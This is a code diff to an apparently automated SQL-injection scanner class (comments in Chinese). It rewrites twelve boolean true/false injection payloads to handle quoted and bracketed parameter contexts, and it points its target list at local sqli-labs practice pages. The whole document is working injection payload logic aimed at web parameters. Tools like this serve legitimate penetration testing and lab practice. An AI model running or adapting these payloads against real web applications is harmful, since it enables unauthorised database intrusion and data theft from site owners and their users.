@@ -217,7 +217,13 @@ class SQLInjectionTime(object):
             equalitySign = '!='
 
         # 先不管数字型的，只看字符
-        payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
+        hasbrackets = True if quoteChar.find(')') > -1  else False
+        prefix_payload = ''
+        if not hasbrackets:
+            payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            prefix_payload = quoteChar[:quoteChar.find(')')]
+            payload1 = likeStr + quoteChar + " AND 2*3*8=6*8 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         # 生成payload
         logger.info("payload1= {}".format(repr(payload1)))
         paramValue = self.get_request_payload(origValue, varIndex, payload1)
@@ -235,7 +241,10 @@ class SQLInjectionTime(object):
         # add to confirmInjectionHistory
 
         # 测试假值
-        payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'--' +  likeStr
+        if not hasbrackets:
+            payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload2 = likeStr + quoteChar + " AND 2*3*8=6*9 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload2= {}".format(payload2))
         paramValue = self.get_request_payload(origValue, varIndex, payload2)
 
@@ -251,7 +260,10 @@ class SQLInjectionTime(object):
 
         # add to confirmInjectionHistory
         # 再测一个假值
-        payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
+        if not hasbrackets:
+            payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload3 = likeStr + quoteChar + " AND 3*3<(2*4) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload3= {}".format(payload3))
         paramValue = self.get_request_payload(origValue, varIndex, payload3)
         logger.debug("paramValue= {}".format(paramValue))
@@ -266,7 +278,10 @@ class SQLInjectionTime(object):
             return False
 
         # add to confirmInjectionHistory
-        payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
+        if not hasbrackets:
+            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload4 = likeStr + quoteChar + " AND 3*2>(1*5) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload4= {}".format(payload4))
         paramValue = self.get_request_payload(origValue, varIndex, payload4)
 
@@ -282,7 +297,10 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 测试真值
-        payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
+        if not hasbrackets:
+            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload5 = likeStr + quoteChar + " AND 3*2*0>=0 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload5= {}".format(payload5))
         paramValue = self.get_request_payload(origValue, varIndex, payload5)
 
@@ -298,7 +316,10 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 然后再测假值
-        payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
+        if not hasbrackets:
+            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload6 = likeStr + quoteChar + " AND 3*3*9<(2*4) AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload6= {}".format(payload6))
         paramValue = self.get_request_payload(origValue, varIndex, payload6)
 
@@ -316,7 +337,10 @@ class SQLInjectionTime(object):
 
         # do some common test
         # common test 真值
-        payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
+        if not hasbrackets:
+            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload7 = likeStr + quoteChar + " AND 5*4=20 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload7= {}".format(payload7))
         paramValue = self.get_request_payload(origValue, varIndex, payload7)
 
@@ -332,7 +356,10 @@ class SQLInjectionTime(object):
         # add to confirmInjectionHistory
 
         # common test 假值
-        payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
+        if not hasbrackets:
+            payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload8 = likeStr + quoteChar + " AND 5*4=21 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload8= {}".format(payload8))
         paramValue = self.get_request_payload(origValue, varIndex, payload8)
 
@@ -348,7 +375,10 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 假值
-        payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
+        if not hasbrackets:
+            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload9 = likeStr + quoteChar + " AND 5*6<26 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload9= {}".format(payload9))
         paramValue = self.get_request_payload(origValue, varIndex, payload9)
 
@@ -364,7 +394,10 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 真值
-        payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' + likeStr
+        if not hasbrackets:
+            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload10 = likeStr + quoteChar + " AND 7*7>48 AND " +  '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload10= {}".format(payload10))
         paramValue = self.get_request_payload(origValue, varIndex, payload10)
 
@@ -379,7 +412,10 @@ class SQLInjectionTime(object):
             return False
 
         # 假值
-        payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +  likeStr
+        if not hasbrackets:
+            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload11 = likeStr + quoteChar + " AND 3*2*0=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload11= {}".format(payload11))
         paramValue = self.get_request_payload(origValue, varIndex, payload11)
 
@@ -395,7 +431,10 @@ class SQLInjectionTime(object):
         # and to conrimInjecitionHistory
 
         # 真值
-        payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '\'' + randStr + '\'' + equalitySign + '\'' + randStr + '\'-- ' +likeStr
+        if not hasbrackets:
+            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + quoteChar + randStr + quoteChar + equalitySign + quoteChar + randStr  + likeStr
+        else:
+            payload12 = likeStr + quoteChar + " AND 3*2*1=6 AND " + '(' + prefix_payload + randStr + prefix_payload + equalitySign + prefix_payload + randStr  + likeStr
         logger.info("payload12= {}".format(payload12))
         paramValue = self.get_request_payload(origValue, varIndex, payload12)
 
@@ -944,21 +983,21 @@ def main():
     #url = 'http://10.127.21.237/sqli-labs/Less-23/?id=1'
     #url = 'http://10.127.21.237/sqli-labs/Less-25/?id=1'
     url = 'http://10.127.21.237/sqli-labs/Less-25a/?id=1'
-    url_list = ['http://10.127.21.237/sqli-labs/Less-26/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-1/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-2/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-3/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-26a/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-27/?id=1',]
-    #url_list += ['http://10.127.21.237/sqli-labs/Less-27a/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-28/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-28a/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-29/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-30/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-31/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-32/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-33/?id=1',]
-    url_list += ['http://10.127.21.237/sqli-labs/Less-35/?id=1',]
+    url_list = ['http://127.0.0.1/sqli-labs/Less-26/?id=1',]
+    url_list += ['http://127.0.0.1/sqli-labs/Less-1/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-2/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-3/?id=1',]
+    #url_list += ['http://127.0.0.1/sqli-labs/Less-26a/?id=1',]
+    #url_list += ['http://127.0.0.1/sqli-labs/Less-27/?id=1',]
+    #url_list += ['http://127.0.0.1/sqli-labs/Less-27a/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-28/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-28a/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-29/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-30/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-31/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-32/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-33/?id=1',]
+    # url_list += ['http://127.0.0.1/sqli-labs/Less-35/?id=1',]
     #url_list += ['http://10.127.21.237/sqli-labs/Less-36/?id=1',]
     #url_list += ['http://10.127.21.237/sqli-labs/Less-38/?id=1',]
     #url_list += ['http://10.127.21.237/sqli-labs/Less-39/?id=1',]
